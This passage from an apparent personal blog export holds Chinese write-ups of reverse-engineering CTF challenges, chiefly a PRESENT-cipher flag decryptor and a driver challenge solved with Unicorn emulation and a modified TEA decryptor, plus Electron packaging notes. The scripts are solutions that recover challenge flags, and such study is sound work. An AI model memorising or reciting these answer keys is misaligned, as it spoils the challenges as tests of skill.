class="number">32</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wrong flag!&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">blocks = [inp[:<span class="number">8</span>], inp[<span class="number">8</span>:<span class="number">16</span>], inp[<span class="number">16</span>:<span class="number">24</span>], inp[<span class="number">24</span>:<span class="number">32</span>]]</span><br><span class="line"></span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line"></span><br><span class="line">out_blocks = encrypt(blocks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> cmps[i] != out_blocks[i]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong flag!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Correct!&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>是个 PRESENT 加密</p>
<p>解密 exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Sbox = [<span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">PBox = [</span><br><span class="line">    <span class="number">0</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">33</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">34</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">35</span>, <span class="number">51</span>,</span><br><span class="line">    <span class="number">4</span>, <span class="number">20</span>, <span class="number">36</span>, <span class="number">52</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">23</span>, <span class="number">39</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">8</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">56</span>, <span class="number">9</span>, <span class="number">25</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">26</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">43</span>, <span class="number">59</span>,</span><br><span class="line">    <span class="number">12</span>, <span class="number">28</span>, <span class="number">44</span>, <span class="number">60</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">45</span>, <span class="number">61</span>, <span class="number">14</span>, <span class="number">30</span>, <span class="number">46</span>, <span class="number">62</span>, <span class="number">15</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">63</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state, roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key, rounds</span>):</span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rounds + <span class="number">1</span>):</span><br><span class="line">        roundkeys.append(key &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        key = ((key &amp; <span class="number">524287</span>) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">        key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>) + (key &amp; ((<span class="number">2</span> ** <span class="number">76</span>) - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        key ^= (i &lt;&lt; <span class="number">15</span>) ^ (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_sBoxLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        output += Sbox_inv[(state &gt;&gt; (i * <span class="number">4</span>)) &amp; <span class="number">15</span>] &lt;&lt; (i * <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_pLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        output += ((state &gt;&gt; i) &amp; <span class="number">1</span>) &lt;&lt; PBox_inv[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">number2string</span>(<span class="params">n</span>):</span><br><span class="line">    chars = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        chars.append(<span class="built_in">chr</span>((n &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphers</span>):</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    out = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">        state = cipher</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            state = addRoundKey(state, roundkeys[i])</span><br><span class="line">            state = inv_pLayer(state)</span><br><span class="line">            state = inv_sBoxLayer(state)</span><br><span class="line"></span><br><span class="line">        block = addRoundKey(state, roundkeys[<span class="number">0</span>])</span><br><span class="line">        out.append(number2string(block))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line"></span><br><span class="line">decrypted_flag = decrypt(cmps)</span><br><span class="line"><span class="built_in">print</span>(decrypted_flag)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>cpp虚表逆向初探</title>
    <url>/2023/10/12/cpp%E8%99%9A%E8%A1%A8%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface起因是近年flare-on的一个题疑似用的虚表实际上好像不是不过刚好看见就来研究一下"><a class="markdownIt-Anchor" href="#preface起因是近年flare-on的一个题疑似用的虚表实际上好像不是不过刚好看见就来研究一下">#</a> PREFACE：起因是近年 flare-on 的一个题疑似用的虚表（实际上好像不是，不过刚好看见就来研究一下）</h6>
<span id="more"></span>
<p>修复方法可以看这篇，挺好用的：<a href="https://www.anquanke.com/post/id/85201">【技术分享】逆向 C++ 虚函数（一）- 安全客 - 安全资讯平台 (anquanke.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>electron 打包</title>
    <url>/2023/09/06/electron-%E6%89%93%E5%8C%85/</url>
    <content><![CDATA[<h6 id="preface小学期作业新加的需求原来没玩过记录一下"><a class="markdownIt-Anchor" href="#preface小学期作业新加的需求原来没玩过记录一下">#</a> preface：小学期作业新加的需求，原来没玩过，记录一下</h6>
<span id="more"></span>
<p>[参考知乎](<a href="https://zhuanlan.zhihu.com/p/430760821">使用 Electron 给 Python 程序加上 GUI - 知乎 (zhihu.com)</a>)</p>
<h5 id="1打包python文件"><a class="markdownIt-Anchor" href="#1打包python文件">#</a> 1. 打包 python 文件</h5>
<h5 id="2修改js中调用python的代码"><a class="markdownIt-Anchor" href="#2修改js中调用python的代码">#</a> 2. 修改 js 中调用 python 的代码</h5>
<h5 id="3构建文件并打包electron"><a class="markdownIt-Anchor" href="#3构建文件并打包electron">#</a> 3. 构建文件并打包 electron</h5>
<hr>
<h5 id="1打包python文件-2"><a class="markdownIt-Anchor" href="#1打包python文件-2">#</a> 1. 打包 python 文件</h5>
<ul>
<li>nuitka 打包</li>
</ul>
<p><code>pip install nuitka</code></p>
<p><code>python -m nuitka frontend.py --follow-imports</code>  (–follow-imports 会附带打包依赖)</p>
<ul>
<li>pyinstaller</li>
</ul>
<p><code>pyinstaller -F C:\Users\18238\Downloads\packTest\byrFileShare-frontend\client\frontend.py</code></p>
<h5 id="2修改js中调用python的代码-2"><a class="markdownIt-Anchor" href="#2修改js中调用python的代码-2">#</a> 2. 修改 js 中调用 python 的代码</h5>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> python = <span class="title function_">spawn</span>(<span class="string">&#x27;python&#x27;</span>, [<span class="string">&#x27;\frontend.exe&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p><img loading="lazy" data-src="electron-%E6%89%93%E5%8C%85/image-20230906102010240.png" alt="image-20230906102010240"></p>
<h5 id="3构建文件并打包electron-2"><a class="markdownIt-Anchor" href="#3构建文件并打包electron-2">#</a> 3. 构建文件并打包 electron</h5>
<p><code>npm install electron --save-dev</code></p>
<p><code>npm init</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"># package.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;your-app&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:/Users/18238/Downloads/packTest/byrFileShare-frontend/frontend/main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron .&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;package&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-packager ./ test --platform=win32 --arch=x64&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;electron-packager&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^17.1.2&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;electron&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^latest-version&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>npm run package</code></p>
]]></content>
  </entry>
  <entry>
    <title>driver复现(铁三2024)</title>
    <url>/2024/04/02/driver%E5%A4%8D%E7%8E%B0-%E9%93%81%E4%B8%892024/</url>
    <content><![CDATA[<h6 id="preface之前看了不少驱动开发然后发现这题调不起来静态解不出来赛后速通unicorn写了个模拟看看"><a class="markdownIt-Anchor" href="#preface之前看了不少驱动开发然后发现这题调不起来静态解不出来赛后速通unicorn写了个模拟看看">#</a> PREFACE：之前看了不少驱动开发，然后发现这题调不起来，静态解不出来，赛后速通 unicorn 写了个模拟看看</h6>
<span id="more"></span>
<p>首先，可以看到文件的前 0x400 字符是文件头信息，先 rebase+0x400</p>
<p>这里直接贴一个 unicorn 脚本，可以看到 tea 的操作，前后转化了一次端序然后标准 TEA， which is WRONG：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">REAL_BASE_OFFSET = <span class="number">0x400</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hookDbgPrint</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    code = mu.mem_read(address, size)</span><br><span class="line">    <span class="comment"># for instruction in md.disasm(code, address):</span></span><br><span class="line">    <span class="comment">#     print(&quot;0x%x: %s %s&quot; % (instruction.address, instruction.mnemonic, instruction.op_str))</span></span><br><span class="line">    DbgList = [<span class="number">0x1400015C9</span>]</span><br><span class="line">    <span class="keyword">if</span> (address <span class="keyword">in</span> DbgList):</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;hook: <span class="subst">&#123;address&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x140001940</span>):</span><br><span class="line">        TEAoutput = mu.mem_read(mu.reg_read(UC_X86_REG_RAX), <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1400017DB</span>):</span><br><span class="line">        <span class="comment"># mu.mem_write(mu.reg_read(UC_X86_REG_RSP) + 40, b&#x27;12345678&#x27;)</span></span><br><span class="line">        TEAinput = mu.mem_read(mu.reg_read(UC_X86_REG_RSP) + <span class="number">40</span>, <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;tea in: &quot;</span>,<span class="built_in">bytes</span>(TEAinput))</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x14000166D</span>):</span><br><span class="line">        mu.mem_write(mu.reg_read(UC_X86_REG_RSP) + <span class="number">144</span>, <span class="string">b&#x27;12345678&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x14000182D</span>):</span><br><span class="line">        TEAoutput = mu.mem_read(mu.reg_read(UC_X86_REG_RSP) + <span class="number">40</span>, <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;tea out: &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> TEAoutput:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x14000197A</span>):</span><br><span class="line">        ENCoutput = mu.mem_read(mu.reg_read(UC_X86_REG_RSP) + <span class="number">40</span>, <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;enc out:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ENCoutput:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hookEND</span>(<span class="params">mu : Uc,address,size,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x14000197A</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">        <span class="comment"># exit(0)</span></span><br><span class="line">        mu.emu_stop()</span><br><span class="line"></span><br><span class="line">mu = Uc (UC_ARCH_X86, UC_MODE_64)</span><br><span class="line">BASE = <span class="number">0x140001000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x1000</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line">mu.mem_write(BASE, read(<span class="string">&quot;./ez_driver.sys&quot;</span>))</span><br><span class="line">mu.reg_write(UC_X86_REG_RBP, STACK_ADDR + STACK_SIZE // <span class="number">2</span>)</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE // <span class="number">3</span>)</span><br><span class="line">mu.hook_add(UC_HOOK_CODE,hookDbgPrint)</span><br><span class="line">mu.hook_add(UC_HOOK_CODE,hookEND)</span><br><span class="line">mu.emu_start(<span class="number">0x14000161D</span>, <span class="number">0x140004000</span>)</span><br></pre></td></tr></table></figure>
<p>另一个加密就是对称的，其实看了就知道只做了 xor，重写一遍就行：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">BYTE byte_140004000[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0x62</span>, <span class="number">0xAE</span>, <span class="number">0x34</span>, <span class="number">0x52</span>, <span class="number">0x9A</span>, <span class="number">0x06</span>, <span class="number">0xAF</span>, </span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xFB</span>, <span class="number">0x40</span>, <span class="number">0xC0</span>, <span class="number">0x10</span>, <span class="number">0x35</span>, <span class="number">0xBD</span>, <span class="number">0xD4</span>,</span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0xA5</span>, <span class="number">0x93</span>, <span class="number">0x07</span>, <span class="number">0xB4</span>, <span class="number">0xFB</span>, <span class="number">0xB5</span>, <span class="number">0xCA</span>,</span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xAE</span>, <span class="number">0xED</span>, <span class="number">0x7B</span>, <span class="number">0xB8</span>, <span class="number">0x6A</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001A70</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *input, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> input_xor; <span class="comment">// [rsp+Ch] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *p_input_xor; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-28h]</span></span><br><span class="line">  </span><br><span class="line">  v7[<span class="number">1</span>] = a2 ^ <span class="number">0x25</span>;</span><br><span class="line">  v7[<span class="number">0</span>] = a2 ^ <span class="number">0x7A</span>;</span><br><span class="line">  v7[<span class="number">8</span>] = a2 ^ <span class="number">0x1A</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = a2 ^ <span class="number">0x35</span>;</span><br><span class="line">  v7[<span class="number">9</span>] = a2 ^ <span class="number">0x6D</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = a2 ^ <span class="number">0x23</span>;</span><br><span class="line">  v7[<span class="number">11</span>] = a2 ^ <span class="number">0x94</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = a2 ^ <span class="number">0xC5</span>;</span><br><span class="line">  v7[<span class="number">5</span>] = a2 ^ <span class="number">0x4B</span>;</span><br><span class="line">  v7[<span class="number">6</span>] = a2 ^ <span class="number">0x21</span>;</span><br><span class="line">  v7[<span class="number">7</span>] = a2 ^ <span class="number">0x35</span>;</span><br><span class="line">  v7[<span class="number">10</span>] = a2 ^ <span class="number">0x91</span>;</span><br><span class="line">  v7[<span class="number">12</span>] = a2 ^ <span class="number">0x2C</span>;</span><br><span class="line">  v7[<span class="number">13</span>] = a2 ^ <span class="number">0xC1</span>;</span><br><span class="line">  v7[<span class="number">14</span>] = a2 ^ <span class="number">0x92</span>;</span><br><span class="line">  v7[<span class="number">15</span>] = a2 ^ <span class="number">0x51</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    p_input_xor = (<span class="type">unsigned</span> <span class="type">char</span>*)&amp;input_xor;</span><br><span class="line">    input_xor = *input ^ a2;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">      *p_input_xor++ ^= v7[<span class="number">15</span> - (((<span class="type">unsigned</span> __int8)i + (<span class="type">unsigned</span> __int8)j) &amp; <span class="number">0xF</span>)] | ((<span class="type">unsigned</span> __int8)j &lt;&lt; j) | j | <span class="number">4</span>;</span><br><span class="line">    v6 = ~a2 ^ input_xor;</span><br><span class="line">    *input++ = v6;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v8 = <span class="number">0</span>;</span><br><span class="line">  BYTE* v17 = byte_140004000;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_140001A70</span>((<span class="type">unsigned</span> <span class="type">int</span> *)v17, v8++);</span><br><span class="line">    v17 += <span class="number">16</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> (v8 &lt; <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c : byte_140004000)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, c);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后发现模拟结果和解密明明对得上，但是出不来，结论是藏东西了或者改东西了，毕竟没有真起起来调，然后发现前面有这个 init，寻找特定的结构 shr ecx, 0x5，把 5 改成 6</p>
<p><img loading="lazy" data-src="driver%E5%A4%8D%E7%8E%B0-%E9%93%81%E4%B8%892024/image.png" alt="image"></p>
<p>土里刨一个脚本出来：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0x9E3779B9</span> * <span class="number">33</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    r -= (key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ (l + ((l &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * l)));</span><br><span class="line">    sum += <span class="number">0x61C88647</span>;</span><br><span class="line">    l -= (key[sum &amp; <span class="number">3</span>] + sum) ^ (r + ((r &gt;&gt; <span class="number">6</span>) ^ (<span class="number">16</span> * r)));</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l, v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">// 加解密对称！！！</span></span><br><span class="line"><span class="comment">//  uint8_t enc[] = &#123;0x72, 0x62, 0xAE, 0x34, 0x52, 0x9A, 0x06, 0xAF, </span></span><br><span class="line"><span class="comment">//              0x72, 0xFB, 0x40, 0xC0, 0x10, 0x35, 0xBD, 0xD4,</span></span><br><span class="line"><span class="comment">//              0x22, 0xA5, 0x93, 0x07, 0xB4, 0xFB, 0xB5, 0xCA,</span></span><br><span class="line"><span class="comment">//              0xE8, 0x01, 0xF5, 0xAE, 0xED, 0x7B, 0xB8, 0x6A&#125;;</span></span><br><span class="line">  <span class="type">uint8_t</span> enc[] = &#123;<span class="number">216</span>,<span class="number">10</span>,<span class="number">158</span>,<span class="number">244</span>,<span class="number">59</span>,<span class="number">162</span>,<span class="number">215</span>,<span class="number">207</span>,<span class="number">72</span>,<span class="number">43</span>,<span class="number">33</span>,<span class="number">160</span>,<span class="number">195</span>,<span class="number">93</span>,<span class="number">221</span>,<span class="number">84</span>,<span class="number">137</span>,<span class="number">205</span>,<span class="number">162</span>,<span class="number">199</span>,<span class="number">220</span>,<span class="number">195</span>,<span class="number">101</span>,<span class="number">170</span>,<span class="number">211</span>,<span class="number">209</span>,<span class="number">149</span>,<span class="number">206</span>,<span class="number">63</span>,<span class="number">19</span>,<span class="number">217</span>,<span class="number">234</span>&#125;;</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0x1A2B</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x3A4D</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x5E6F</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">0xAA33</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i+=<span class="number">8</span>)&#123;</span><br><span class="line">    <span class="type">uint32_t</span> *p = (<span class="type">uint32_t</span> *)&amp;enc[i];</span><br><span class="line">    p[<span class="number">0</span>] = __builtin_bswap32(p[<span class="number">0</span>]);</span><br><span class="line">    p[<span class="number">1</span>] = __builtin_bswap32(p[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">decrypt</span>((<span class="type">uint32_t</span>*)p,key);</span><br><span class="line">    p[<span class="number">0</span>] = __builtin_bswap32(p[<span class="number">0</span>]);</span><br><span class="line">    p[<span class="number">1</span>] = __builtin_bswap32(p[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,enc[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>flare-on2023</title>
    <url>/2023/10/04/flare-on2023/</url>
    <content><![CDATA[<h6 id="preface-很有含金量的题有点小难而且和平时做的差别很大稍稍有点不对感觉但是做起来能学到很多东西"><a class="markdownIt-Anchor" href="#preface-很有含金量的题有点小难而且和平时做的差别很大稍稍有点不对感觉但是做起来能学到很多东西">#</a> PREFACE: 很有含金量的题，有点小难，而且和平时做的差别很大，稍稍有点不对感觉，但是做起来能学到很多东西.</h6>
<h6 id="ps-边记边写吧挺大强度的后面怕忘了另外这国庆怎么快没了"><a class="markdownIt-Anchor" href="#ps-边记边写吧挺大强度的后面怕忘了另外这国庆怎么快没了">#</a> ps. 边记边写吧… 挺大强度的后面怕忘了… 另外这国庆怎么快没了…</h6>
